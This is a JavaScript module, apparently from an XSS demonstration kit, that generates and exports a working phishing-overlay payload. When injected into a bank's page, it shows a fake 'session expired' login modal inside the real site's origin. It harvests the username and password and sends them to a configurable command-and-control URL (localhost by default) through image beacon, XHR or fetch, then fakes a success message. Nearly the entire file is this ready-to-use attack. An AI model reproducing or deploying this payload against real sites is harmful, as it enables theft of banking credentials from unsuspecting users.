/**
 * Vector B — In-Context Phishing Overlay
 *
 * Technical Mechanism:
 *   1. Injected HTML/CSS modal renders in the legitimate bank origin.
 *   2. Abuses origin trust (the address bar displays legitimate bank URL).
 *   3. Harvests submitted credentials and exfiltrates them to Attacker C2.
 */

function generatePayload(c2Url = 'http://127.0.0.1:5002') {
  return `<div id="xss-phish-modal" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(15,23,42,0.85);backdrop-filter:blur(4px);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif;">
  <div style="background:#ffffff;border-radius:12px;padding:28px;width:380px;box-shadow:0 20px 25px -5px rgba(0,0,0,0.3);border:1px solid #e2e8f0;">
    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
      <span style="font-size:26px;">🏦</span>
      <div>
        <h3 style="margin:0;font-size:16px;font-weight:700;color:#0f172a;">SecureBank Security Check</h3>
        <span style="font-size:12px;color:#dc2626;font-weight:600;">⚠️ Session Expired</span>
      </div>
    </div>
    <p style="font-size:13px;color:#64748b;margin:0 0 16px 0;line-height:1.4;">
      Your active session has expired for your protection. Please verify your credentials to continue your banking session.
    </p>
    <form id="xss-phish-form" style="display:flex;flex-direction:column;gap:12px;">
      <div>
        <label style="display:block;font-size:12px;font-weight:600;color:#334155;margin-bottom:4px;">Username</label>
        <input name="user" type="text" value="victim" required style="width:100%;box-sizing:border-box;padding:8px 12px;border:1px solid #cbd5e1;border-radius:6px;font-size:14px;color:#0f172a;">
      </div>
      <div>
        <label style="display:block;font-size:12px;font-weight:600;color:#334155;margin-bottom:4px;">Password</label>
        <input name="pass" type="password" placeholder="Enter bank password" required style="width:100%;box-sizing:border-box;padding:8px 12px;border:1px solid #cbd5e1;border-radius:6px;font-size:14px;color:#0f172a;">
      </div>
      <button type="submit" id="xss-phish-btn" style="width:100%;padding:10px;background:#b91c1c;color:#ffffff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;margin-top:4px;">
        Verify & Continue
      </button>
    </form>
  </div>
</div>
<script>
(function() {
  var form = document.getElementById('xss-phish-form');
  if (!form) return;
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    var fd = new FormData(form);
    var creds = {
      user: fd.get('user') || 'victim',
      pass: fd.get('pass') || 'secret',
      timestamp: new Date().toISOString()
    };
    var dataStr = 'PHISH_CREDS:' + JSON.stringify(creds);
    var encoded = encodeURIComponent(dataStr);
    var sent = false;
    try { new Image().src = '${c2Url}/log?data=' + encoded; sent = true; } catch(e) {}
    if (!sent) { try { var x = new XMLHttpRequest(); x.open('GET', '${c2Url}/log?data=' + encoded, true); x.send(); sent = true; } catch(e) {} }
    if (!sent) { try { fetch('/log?data=' + encoded).catch(function(){}); } catch(e) {} }
    var container = document.getElementById('xss-phish-modal');
    container.innerHTML = '<div style="background:#fff;padding:24px 32px;border-radius:12px;text-align:center;font-family:sans-serif;box-shadow:0 20px 25px rgba(0,0,0,0.3);"><div style="font-size:32px;margin-bottom:8px;">✅</div><h3 style="margin:0 0 4px;color:#065f46;">Identity Verified</h3><p style="margin:0;font-size:13px;color:#64748b;">Restoring banking dashboard...</p></div>';
    setTimeout(function() {
      container.remove();
    }, 1200);
  });
})();
</script>`;
}

const payload = generatePayload('http://127.0.0.1:5002');
const encodedPayload = encodeURIComponent(payload);

module.exports = {
  name: 'Vector B — In-Context Phishing Overlay',
  payload,
  encodedPayload,
  generatePayload
};
